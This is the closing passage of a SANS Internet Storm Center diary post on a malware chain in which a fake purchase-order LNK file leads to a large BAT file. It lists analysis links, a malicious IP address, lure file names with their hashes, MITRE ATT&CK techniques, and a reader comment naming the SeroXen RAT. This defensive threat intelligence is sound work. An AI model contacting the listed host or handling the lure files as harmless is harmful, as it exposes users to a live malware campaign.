[6] <a href="https://analyze.intezer.com/analyses/6838b5fc-629a-45a5-b40c-57bcabe21c3d/sub/cbf91332-c33b-4edd-9219-dc3b54e63955/">https://analyze.intezer.com/analyses/6838b5fc-629a-45a5-b40c-57bcabe21c3d/sub/cbf91332-c33b-4edd-9219-dc3b54e63955/</a><br />
[7] <a href="https://analyze.intezer.com/analyses/ac6cf7d6-ed1d-4be2-8a65-b3f6658ed3e1/sub/f993c083-5163-4242-9f41-6aed792a3ab2/">https://analyze.intezer.com/analyses/ac6cf7d6-ed1d-4be2-8a65-b3f6658ed3e1/sub/f993c083-5163-4242-9f41-6aed792a3ab2/</a></p>

<p>&nbsp;</p>

<p><strong>Indicators of Compromise (IoCs)</strong></p>

<p><u>IPs</u><br />
85.208.139.229</p>

<p><u>Files</u><br />
Purchase%20Order%20PO007289.pdf.lnk (15 kB)<br />
MD5 304a9ab4d385a6d4c8d45002f92342fa<br />
SHA-1 93700d836102ff1c857c880a8cad4b4387d54de9<br />
SHA-256 e3602d0eb7149004ae6cf4befec8c6d61ac391189122744fff4a1de2cdad4aa3</p>

<p>Purchase%20Order%20PO007289.pdf (2134 kB)<br />
MD5 bfd3ae8bb20e06f32f5b46100dc498c2<br />
SHA-1 5b9ccd750f86ad1a022f8d0eba477a86ca08f6b8<br />
SHA-256 448bf205f66888cd2661b3b7531632a4d0f1e91ccc6568de07f0fdb41f4d96f8</p>

<p>Uni.bat (14235 kB)<br />
MD5 6038fb0dd91fa1e9cca80ea225d8b59b<br />
SHA-1 98d630a01d50675988898185ac8088673409c8a0<br />
SHA-256 8c01ef8b6a9cfa7a80fd5bcb640d68a63ef17dd25ea3e260c7971b1fa156c8be</p>

<p>&nbsp;</p>

<p><strong>TTPs associated with the campaign</strong></p>

<p><a href="https://attack.mitre.org/techniques/T1566/001/">T1566.001 &ndash; Phishing: Spearphishing Attachment</a><br />
<a href="https://attack.mitre.org/techniques/T1204/002/">T1204.002 &ndash; User Execution: Malicious File</a><br />
<a href="https://attack.mitre.org/techniques/T1059/001/">T1059.001 &ndash; Command and Scripting Interpreter: PowerShell</a><br />
<a href="https://attack.mitre.org/techniques/T1059/003/">T1059.003 &ndash; Command and Scripting Interpreter: Windows Command Shell</a><br />
<a href="https://attack.mitre.org/techniques/T1036/">T1036 &ndash; Masquerading</a><br />
<a href="https://attack.mitre.org/techniques/T1036/003/">T1036.003 &ndash; Masquerading: Rename System Utilities</a><br />
<a href="https://attack.mitre.org/techniques/T1036/007/">T1036.007 &ndash; Masquerading: Double File Extension</a><br />
<a href="https://attack.mitre.org/techniques/T1036/008/">T1036.008 &ndash; Masquerading: Masquerade File Type</a><br />
<a href="https://attack.mitre.org/techniques/T1027/">T1027 &ndash; Obfuscated Files or Information</a><br />
<a href="https://attack.mitre.org/techniques/T1027/010/">T1027.010 &ndash; Obfuscated Files or Information: Command Obfuscation</a><br />
<a href="https://attack.mitre.org/techniques/T1497/">T1497 &ndash; Virtualization/Sandbox Evasion</a><br />
<a href="https://attack.mitre.org/techniques/T1620/">T1620 &ndash; Reflective Code Loading</a></p>

<p>-----------<br />
Jan Kopriva<br />
<a href="https://twitter.com/jk0pr">@jk0pr</a><br />
<a href="https://www.nettles.cz/">Nettles Consulting</a></p>

</div>
<div class="diarykeywords">Keywords: <a href="/tag.html?tag=BAT">BAT</a> <a href="/tag.html?tag=malware">malware</a> <a href="/tag.html?tag=powershell">powershell</a> </div>
<a class="ico-comments" href="/diary/From+small+LNK+to+large+malicious+BAT+file+with+zero+VT+score/30094/#comments">1 comment(s)</a></article>

<ul class="diaryPagination"><li><a href="/diary/30088">previous</a></li><li><a href="/diary/30098">next</a></li></ul><div id="comment-section">
        <a id="comments"></a>
        <h3>Comments</h3>
            <div class="isc-card" id="card45304">
                <div class="card-body">The .NET file (623323d7fc27927dd0c7e08208d6677ca8bf64263e38e31de00660a3156964a4) ends up loading SeroXen RAT. See: https://cybersecurity.att.com/blogs/labs-research/seroxen-rat-for-sale</div>
                <div class="card-footer">
                    <div class="author-footer">
                        <h4>Jamie</h4> 
                        <h4>Aug 9th 2023<br/>1 year  ago</h4>
                    </div>
                </div>
            </div>
        </div>
        <div class="isc-card">
            <p><a href="/login">Login here to join the discussion.</a></p>
        </div><br />


<div class="top-link"><a href="#">Top of page</a></div><!-- / .top-link --><div id="myModal" class="modal">

  <!-- The Close Button -->
  <span class="close">&times;</span>

  <!-- Modal Content (The Image) -->
  <img class="modal-content" id="img01" alt="modal content">

  <!-- Modal Caption (Image Text) -->
  <div id="caption"></div>
</div>
<a class="diaryArchive" href="/diaryarchive.html">Diary Archives</a>

<script type="text/javascript">
    'use strict';
    hljs.initHighlightingOnLoad();
    var block = $('.diary-body pre code');
    if (block.length > 0) {
        block.parent().wrap('<div class="code-wrapper"></div>')
    }
</script>


        </div>
    </div>
    </div>
    <span id="isc-menu" class="isc-menu" tabindex="0" aria-label="Open the menu">
        <span class="bar" aria-hidden="true"></span>
        <span class="bar" aria-hidden="true"></span>
        <span class="bar" aria-hidden="true"></span>
    </span>
    <div id="navigation" class="isc-nav">
        <ul>







	        <li>
	            <a href="/index.html">
	                <svg style="width:20px;height:20px" viewBox="0 0 24 24">
                        <path fill="currentColor" d="M10,20V14H14V20H19V12H22L12,3L2,12H5V20H10Z" />
                    </svg> Homepage
                </a>
            </li>
            <li class="active">
                <a href="/diaryarchive.html">
                    <svg style="width:20px;height:20px" viewBox="0 0 24 24">
                        <path fill="currentColor" d="M17.5 14.33C18.29 14.33 19.13 14.41 20 14.57V16.07C19.38 15.91 18.54 15.83 17.5 15.83C15.6 15.83 14.11 16.16 13 16.82V15.13C14.17 14.6 15.67 14.33 17.5 14.33M13 12.46C14.29 11.93 15.79 11.67 17.5 11.67C18.29 11.67 19.13 11.74 20 11.9V13.4C19.38 13.24 18.54 13.16 17.5 13.16C15.6 13.16 14.11 13.5 13 14.15M17.5 10.5C15.6 10.5 14.11 10.82 13 11.5V9.84C14.23 9.28 15.73 9 17.5 9C18.29 9 19.13 9.08 20 9.23V10.78C19.26 10.59 18.41 10.5 17.5 10.5M21 18.5V7C19.96 6.67 18.79 6.5 17.5 6.5C15.45 6.5 13.62 7 12 8V19.5C13.62 18.5 15.45 18 17.5 18C18.69 18 19.86 18.16 21 18.5M17.5 4.5C19.85 4.5 21.69 5 23 6V20.56C23 20.68 22.95 20.8 22.84 20.91C22.73 21 22.61 21.08 22.5 21.08C22.39 21.08 22.31 21.06 22.25 21.03C20.97 20.34 19.38 20 17.5 20C15.45 20 13.62 20.5 12 21.5C10.66 20.5 8.83 20 6.5 20C4.84 20 3.25 20.36 1.75 21.07C1.72 21.08 1.68 21.08 1.63 21.1C1.59 21.11 1.55 21.12 1.5 21.12C1.39 21.12 1.27 21.08 1.16 21C1.05 20.89 1 20.78 1 20.65V6C2.34 5 4.18 4.5 6.5 4.5C8.83 4.5 10.66 5 12 6C13.34 5 15.17 4.5 17.5 4.5Z" />
                    </svg> Diaries
                </a>
            </li>
            <li>
                <a href="/podcast.html">
                    <svg style="width:20px;height:20px" viewBox="0 0 24 24">
                        <path fill="currentColor" d="M17,18.25V21.5H7V18.25C7,16.87 9.24,15.75 12,15.75C14.76,15.75 17,16.87 17,18.25M12,5.5A6.5,6.5 0 0,1 18.5,12C18.5,13.25 18.15,14.42 17.54,15.41L16,14.04C16.32,13.43 16.5,12.73 16.5,12C16.5,9.5 14.5,7.5 12,7.5C9.5,7.5 7.5,9.5 7.5,12C7.5,12.73 7.68,13.43 8,14.04L6.46,15.41C5.85,14.42 5.5,13.25 5.5,12A6.5,6.5 0 0,1 12,5.5M12,1.5A10.5,10.5 0 0,1 22.5,12C22.5,14.28 21.77,16.39 20.54,18.11L19.04,16.76C19.96,15.4 20.5,13.76 20.5,12A8.5,8.5 0 0,0 12,3.5A8.5,8.5 0 0,0 3.5,12C3.5,13.76 4.04,15.4 4.96,16.76L3.46,18.11C2.23,16.39 1.5,14.28 1.5,12A10.5,10.5 0 0,1 12,1.5M12,9.5A2.5,2.5 0 0,1 14.5,12A2.5,2.5 0 0,1 12,14.5A2.5,2.5 0 0,1 9.5,12A2.5,2.5 0 0,1 12,9.5Z" />
                    </svg> Podcasts
                </a>
            </li>
            <li>
                <a href="/jobs">
                    <svg style="width:20px;height:20px" viewBox="0 0 24 24">
                        <path fill="currentColor" d="M15.5,12C18,12 20,14 20,16.5C20,17.38 19.75,18.21 19.31,18.9L22.39,22L21,23.39L17.88,20.32C17.19,20.75 16.37,21 15.5,21C13,21 11,19 11,16.5C11,14 13,12 15.5,12M15.5,14A2.5,2.5 0 0,0 13,16.5A2.5,2.5 0 0,0 15.5,19A2.5,2.5 0 0,0 18,16.5A2.5,2.5 0 0,0 15.5,14M10,4A4,4 0 0,1 14,8C14,8.91 13.69,9.75 13.18,10.43C12.32,10.75 11.55,11.26 10.91,11.9L10,12A4,4 0 0,1 6,8A4,4 0 0,1 10,4M2,20V18C2,15.88 5.31,14.14 9.5,14C9.18,14.78 9,15.62 9,16.5C9,17.79 9.38,19 10,20H2Z" />
                    </svg> Jobs
                </a>
            </li>
            <li>
                <a href="/data">
                    <svg style="width:20px;height:20px" viewBox="0 0 24 24">
                        <path fill="currentColor" d="M19 3H5C3.9 3 3 3.9 3 5V19C3 20.1 3.9 21 5 21H19C20.1 21 21 20.1 21 19V5C21 3.9 20.1 3 19 3M9 17H7V10H9V17M13 17H11V7H13V17M17 17H15V13H17V17Z" />
                    </svg> Data
                </a>
                <ul>
                    <li><a href="/data/port.html">TCP/UDP Port Activity</a></li>
                    <li><a href="/data/trends.html">Port Trends</a></li>
                    <li><a href="/data/ssh.html">SSH/Telnet Scanning Activity</a></li>
                    <li><a href="/weblogs">Weblogs</a></li>
                    <li><a href="/data/threatfeed.html">Threat Feeds Activity</a></li>
                    <li><a href="/data/threatmap.html">Threat Feeds Map</a></li>
                    <li><a href="/data/links.html">Useful InfoSec Links</a></li>
                    <li><a href="/data/presentation.html">Presentations &amp; Papers</a></li>		    
                    <li><a href="/data/researchpapers.html">Research Papers</a></li>
                    <li><a href="/api">API</a></li>
                </ul>
            </li>
            <li>
                <a href="/tools/">
                    <svg style="width:20px;height:20px" viewBox="0 0 24 24">
                        <path fill="currentColor" d="M22.7,19L13.6,9.9C14.5,7.6 14,4.9 12.1,3C10.1,1 7.1,0.6 4.7,1.7L9,6L6,9L1.6,4.7C0.4,7.1 0.9,10.1 2.9,12.1C4.8,14 7.5,14.5 9.8,13.6L18.9,22.7C19.3,23.1 19.9,23.1 20.3,22.7L22.6,20.4C23.1,20 23.1,19.3 22.7,19Z" />
                    </svg> Tools
                </a>
                <ul>
                    <li class="first"><a href="/howto.html">DShield Sensor</a></li>
                    <li><a href="/tools/dnslookup">DNS Looking Glass</a></li>
		    <li><a href="/tools/honeypot">Honeypot (RPi/AWS)</a></li>
                    <li><a href="/tools/glossary">InfoSec Glossary</a></li>
                </ul>
            </li>
            <li>
                <a href="/contact.html">
                    <svg style="width:20px;height:20px" viewBox="0 0 24 24">
                        <path fill="currentColor" d="M15.07,11.25L14.17,12.17C13.45,12.89 13,13.5 13,15H11V14.5C11,13.39 11.45,12.39 12.17,11.67L13.41,10.41C13.78,10.05 14,9.55 14,9C14,7.89 13.1,7 12,7A2,2 0 0,0 10,9H8A4,4 0 0,1 12,5A4,4 0 0,1 16,9C16,9.88 15.64,10.67 15.07,11.25M13,19H11V17H13M12,2A10,10 0 0,0 2,12A10,10 0 0,0 12,22A10,10 0 0,0 22,12C22,6.47 17.5,2 12,2Z" />
                    </svg>Contact Us
                </a>
                <ul>
		            <li class="first"><a href="/contact.html">Contact Us</a></li>
                    <li><a href="/about.html">About Us</a></li>
                    <li><a href="/handler_list.html">Handlers</a></li>
                </ul>
<li>
<a href="/about.html">
<svg xmlns="http://www.w3.org/2000/svg"  viewBox="0 0 30 30" width="20px" height="20px"><path fill="currentColor" d="M 15.001953 3.9921875 C 12.801953 3.9921875 11.001953 5.7821875 11.001953 7.9921875 C 11.001953 10.202188 12.801953 11.992188 15.001953 11.992188 C 17.211953 11.992188 19.011719 10.202187 19.011719 7.9921875 C 19.011719 5.7821875 17.211953 3.9921875 15.001953 3.9921875 z M 6.0019531 8.0039062 C 3.7919531 8.0039062 2.0019531 9.7939062 2.0019531 12.003906 C 2.0019531 14.213906 3.7919531 16.003906 6.0019531 16.003906 C 8.2119531 16.003906 10.001953 14.213906 10.001953 12.003906 C 10.001953 9.7939062 8.2119531 8.0039062 6.0019531 8.0039062 z M 6.0019531 16.003906 L 5.0019531 16.003906 C 2.7919531 16.003906 1.0019531 17.793906 1.0019531 20.003906 L 1.0019531 22.992188 C 1.0019531 23.542188 1.4519531 23.992188 2.0019531 23.992188 L 28.001953 23.992188 C 28.551953 23.992188 29.001953 23.542188 29.001953 22.992188 L 29.001953 20.003906 C 29.001953 17.793906 27.211953 16.003906 25.001953 16.003906 L 24.001953 16.003906 L 23.001953 16.003906 C 22.151953 16.003906 21.362891 16.272422 20.712891 16.732422 C 20.042891 15.142422 18.311719 13.992187 16.261719 13.992188 L 13.751953 13.992188 C 11.701953 13.992188 9.9727344 15.142187 9.3027344 16.742188 C 8.6527344 16.282187 7.8619531 16.003906 7.0019531 16.003906 L 6.0019531 16.003906 z M 24.001953 16.003906 C 26.211953 16.003906 28.001953 14.213906 28.001953 12.003906 C 28.001953 9.7939062 26.211953 8.0039062 24.001953 8.0039062 C 21.791953 8.0039062 20.001953 9.7939062 20.001953 12.003906 C 20.001953 14.213906 21.791953 16.003906 24.001953 16.003906 z M 6.0019531 10.003906 C 7.1019531 10.003906 8.0019531 10.903906 8.0019531 12.003906 C 8.0019531 13.103906 7.1019531 14.003906 6.0019531 14.003906 C 4.9019531 14.003906 4.0019531 13.103906 4.0019531 12.003906 C 4.0019531 10.903906 4.9019531 10.003906 6.0019531 10.003906 z M 24.001953 10.003906 C 25.101953 10.003906 26.001953 10.903906 26.001953 12.003906 C 26.001953 13.103906 25.101953 14.003906 24.001953 14.003906 C 22.901953 14.003906 22.001953 13.103906 22.001953 12.003906 C 22.001953 10.903906 22.901953 10.003906 24.001953 10.003906 z M 5.0019531 18.003906 L 7.0019531 18.003906 C 8.0819531 18.003906 9.0019531 18.923906 9.0019531 20.003906 L 9.0019531 21.992188 L 3.0019531 21.992188 L 3.0019531 20.003906 C 3.0019531 18.903906 3.9019531 18.003906 5.0019531 18.003906 z M 23.001953 18.003906 L 25.001953 18.003906 C 26.081953 18.003906 27.001953 18.923906 27.001953 20.003906 L 27.001953 21.992188 L 21.011719 21.992188 L 21.011719 19.902344 C 21.061719 18.852344 21.931953 18.003906 23.001953 18.003906 z"/></svg>
About Us</a></li>
        </ul>
<!-- social media links -->
<!-- begin Slack -->
        <div class="questions-sidebar">
            <svg width="16" height="16" class="c-nav--footer__svgicon c-slackhash" viewBox="0 0 54 54" xmlns="http://www.w3.org/2000/svg">
                <g fill="none" fill-rule="evenodd">
                    <path d="M19.712.133a5.381 5.381 0 0 0-5.376 5.387 5.381 5.381 0 0 0 5.376 5.386h5.376V5.52A5.381 5.381 0 0 0 19.712.133m0 14.365H5.376A5.381 5.381 0 0 0 0 19.884a5.381 5.381 0 0 0 5.376 5.387h14.336a5.381 5.381 0 0 0 5.376-5.387 5.381 5.381 0 0 0-5.376-5.386" fill="#435165"></path>
                    <path d="M53.76 19.884a5.381 5.381 0 0 0-5.376-5.386 5.381 5.381 0 0 0-5.376 5.386v5.387h5.376a5.381 5.381 0 0 0 5.376-5.387m-14.336 0V5.52A5.381 5.381 0 0 0 34.048.133a5.381 5.381 0 0 0-5.376 5.387v14.364a5.381 5.381 0 0 0 5.376 5.387 5.381 5.381 0 0 0 5.376-5.387" fill="#435165"></path>
                    <path d="M34.048 54a5.381 5.381 0 0 0 5.376-5.387 5.381 5.381 0 0 0-5.376-5.386h-5.376v5.386A5.381 5.381 0 0 0 34.048 54m0-14.365h14.336a5.381 5.381 0 0 0 5.376-5.386 5.381 5.381 0 0 0-5.376-5.387H34.048a5.381 5.381 0 0 0-5.376 5.387 5.381 5.381 0 0 0 5.376 5.386" fill="#435165"></path>
                    <path d="M0 34.249a5.381 5.381 0 0 0 5.376 5.386 5.381 5.381 0 0 0 5.376-5.386v-5.387H5.376A5.381 5.381 0 0 0 0 34.25m14.336-.001v14.364A5.381 5.381 0 0 0 19.712 54a5.381 5.381 0 0 0 5.376-5.387V34.25a5.381 5.381 0 0 0-5.376-5.387 5.381 5.381 0 0 0-5.376 5.387" fill="#435165"></path>
                </g>
            </svg>
            <a rel="noopener" href="/slack/index.html">Slack Channel</a>
        </div>
<!-- end Slack -->
	<div class="questions-spacer"></div>
<!-- begin mastodon -->
	<div class="questions-sidebar">
	<svg width="16" height="16" viewBox="0 0 54 74" fill="black" xmlns="http://www.w3.org/2000/svg" class="c-nav--footer__svgicon c-slackhash">
<path d="M73.7014 17.4323C72.5616 9.05152 65.1774 2.4469 56.424 1.1671C54.9472 0.950843 49.3518 0.163818 36.3901 0.163818H36.2933C23.3281 0.163818 20.5465 0.950843 19.0697 1.1671C10.56 2.41145 2.78877 8.34604 0.903306 16.826C-0.00357854 21.0022 -0.100361 25.6322 0.068112 29.8793C0.308275 35.9699 0.354874 42.0498 0.91406 48.1156C1.30064 52.1448 1.97502 56.1419 2.93215 60.0769C4.72441 67.3445 11.9795 73.3925 19.0876 75.86C26.6979 78.4332 34.8821 78.8603 42.724 77.0937C43.5866 76.8952 44.4398 76.6647 45.2833 76.4024C47.1867 75.8033 49.4199 75.1332 51.0616 73.9562C51.0841 73.9397 51.1026 73.9184 51.1156 73.8938C51.1286 73.8693 51.1359 73.8421 51.1368 73.8144V67.9366C51.1364 67.9107 51.1302 67.8852 51.1186 67.862C51.1069 67.8388 51.0902 67.8184 51.0695 67.8025C51.0489 67.7865 51.0249 67.7753 50.9994 67.7696C50.9738 67.764 50.9473 67.7641 50.9218 67.7699C45.8976 68.9569 40.7491 69.5519 35.5836 69.5425C26.694 69.5425 24.3031 65.3699 23.6184 63.6327C23.0681 62.1314 22.7186 60.5654 22.5789 58.9744C22.5775 58.9477 22.5825 58.921 22.5934 58.8965C22.6043 58.8721 22.621 58.8505 22.6419 58.8336C22.6629 58.8167 22.6876 58.8049 22.714 58.7992C22.7404 58.7934 22.7678 58.794 22.794 58.8007C27.7345 59.9796 32.799 60.5746 37.8813 60.5733C39.1036 60.5733 40.3223 60.5733 41.5447 60.5414C46.6562 60.3996 52.0437 60.1408 57.0728 59.1694C57.1983 59.1446 57.3237 59.1233 57.4313 59.0914C65.3638 57.5847 72.9128 52.8555 73.6799 40.8799C73.7086 40.4084 73.7803 35.9415 73.7803 35.4523C73.7839 33.7896 74.3216 23.6576 73.7014 17.4323ZM61.4925 47.3144H53.1514V27.107C53.1514 22.8528 51.3591 20.6832 47.7136 20.6832C43.7061 20.6832 41.6988 23.2499 41.6988 28.3194V39.3803H33.4078V28.3194C33.4078 23.2499 31.3969 20.6832 27.3894 20.6832C23.7654 20.6832 21.9552 22.8528 21.9516 27.107V47.3144H13.6176V26.4937C13.6176 22.2395 14.7157 18.8598 16.9118 16.3545C19.1772 13.8552 22.1488 12.5719 25.8373 12.5719C30.1064 12.5719 33.3325 14.1955 35.4832 17.4394L37.5587 20.8853L39.6377 17.4394C41.7884 14.1955 45.0145 12.5719 49.2765 12.5719C52.9614 12.5719 55.9329 13.8552 58.2055 16.3545C60.4017 18.8574 61.4997 22.2371 61.4997 26.4937L61.4925 47.3144Z" fill="inherit"/>
</svg>
            <a rel="me" href="https://infosec.exchange/@sans_isc">Mastodon</a>
        </div>
<!-- end mastodon -->
	<div class="questions-spacer"></div>
<div class="questions-sidebar">
<svg xmlns="http://www.w3.org/2000/svg"  viewBox="0 0 54 54" width="24px" height="24px"><circle cx="28" cy="20" r="12" fill="#9fd5ed"/><circle cx="37" cy="28" r="9" fill="#9fd5ed"/><circle cx="30" cy="29" r="9" fill="#9fd5ed"/><circle cx="18" cy="29" r="9" fill="#9fd5ed"/><circle cx="24" cy="28" r="9" fill="#9fd5ed"/><circle cx="11" cy="28" r="9" fill="#9fd5ed"/><circle cx="15" cy="21" r="7" fill="#9fd5ed"/><radialGradient id="UWqm9mhW35Ao~JVa4RzWya" cx="28" cy="20" r="12" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#e3f4ff"/><stop offset="1" stop-color="#e3f4ff" stop-opacity="0"/></radialGradient><circle cx="28" cy="20" r="12" fill="url(#UWqm9mhW35Ao~JVa4RzWya)"/><radialGradient id="UWqm9mhW35Ao~JVa4RzWyb" cx="37" cy="28" r="9" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#e3f4ff"/><stop offset="1" stop-color="#e3f4ff" stop-opacity="0"/></radialGradient><circle cx="37" cy="28" r="9" fill="url(#UWqm9mhW35Ao~JVa4RzWyb)"/><radialGradient id="UWqm9mhW35Ao~JVa4RzWyc" cx="30" cy="29" r="9" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#e3f4ff"/><stop offset="1" stop-color="#e3f4ff" stop-opacity="0"/></radialGradient><circle cx="30" cy="29" r="9" fill="url(#UWqm9mhW35Ao~JVa4RzWyc)"/><radialGradient id="UWqm9mhW35Ao~JVa4RzWyd" cx="18" cy="29" r="9" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#e3f4ff"/><stop offset="1" stop-color="#e3f4ff" stop-opacity="0"/></radialGradient><circle cx="18" cy="29" r="9" fill="url(#UWqm9mhW35Ao~JVa4RzWyd)"/><radialGradient id="UWqm9mhW35Ao~JVa4RzWye" cx="24" cy="28" r="9" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#e3f4ff"/><stop offset="1" stop-color="#e3f4ff" stop-opacity="0"/></radialGradient><circle cx="24" cy="28" r="9" fill="url(#UWqm9mhW35Ao~JVa4RzWye)"/><radialGradient id="UWqm9mhW35Ao~JVa4RzWyf" cx="11" cy="28" r="9" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#e3f4ff"/><stop offset="1" stop-color="#e3f4ff" stop-opacity="0"/></radialGradient><circle cx="11" cy="28" r="9" fill="url(#UWqm9mhW35Ao~JVa4RzWyf)"/><radialGradient id="UWqm9mhW35Ao~JVa4RzWyg" cx="15" cy="21" r="7" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#e3f4ff"/><stop offset="1" stop-color="#e3f4ff" stop-opacity="0"/></radialGradient><circle cx="15" cy="21" r="7" fill="url(#UWqm9mhW35Ao~JVa4RzWyg)"/></svg>
<a rel="me" href="https://bsky.app/profile/sansisc.bsky.social">Bluesky</a>
</div>
	<div class="questions-spacer"></div>
	<div class="questions-sidebar">
<svg width="16" height="16" viewBox="0 0 1200 1227" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.137 519.284H714.163ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.854V687.828Z" fill="black"/>
</svg>
            <a rel="noopener" href="https://twitter.com/sans_isc">X</a>
</div>
    <div id="sidebar">
        <a href="">
            <img class="lazyload" src="/adimg.html?id=">
        </a>
    
	</div>
</div>
<div id="footer">
    <div class="footer-container">
        <div class="footer-links">
            <span>© 2024 SANS™ Internet Storm Center</span>
            <span>Developers: We have an <a href="/api/">API</a> for you! &nbsp; <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><img class="lazyload" alt="Creative Commons License" src="/images/cc.png"></a></span>
            <ul id="footLinks">
                <li><a href="/linkback.html">Link To Us</a></li>
                <li><a href="/about.html">About Us</a></li>
                <li><a href="/handler_list.html">Handlers</a></li>
                <li><a href="/privacy.html">Privacy Policy</a></li>
            </ul>
        </div>
        <div class="footer-social">
            <ul id="socialIconsFoot">
                <li><a rel="noopener" href="https://www.youtube.com/channel/UCfbOsqPmWg1H_34hTjKEW2A"><span class="youtube"></span></a></li>
                <li class="twitter"><a rel="noopener" href="https://twitter.com/sans_isc"><span class="twitter"></span></a></li>
                <li class="linkedin"><a rel="noopener" href="https://www.linkedin.com/groups?gid=35470"><span class="linkedin"></span></a></li>
		<li class="mastodon"><a rel="noopener" href="https://infosec.exchange/@sans_isc"><span class="mastodon"></span></a></li>
                <li class="rss"><a href="/xml.html"><span class="rss"></span></a></li>
            </ul>
        </div>
    </div>
</div>
<script type="text/javascript" src="/js/main.js"></script>
<script language="JavaScript" type="text/javascript" src="/js/menu.js"></script>
</div>
<script type="text/javascript" src="/_Incapsula_Resource?SWJIYLWA=719d34d31c8e3a6e6fffd425f7e032f3&ns=9&cb=945843693" async></script></body></html>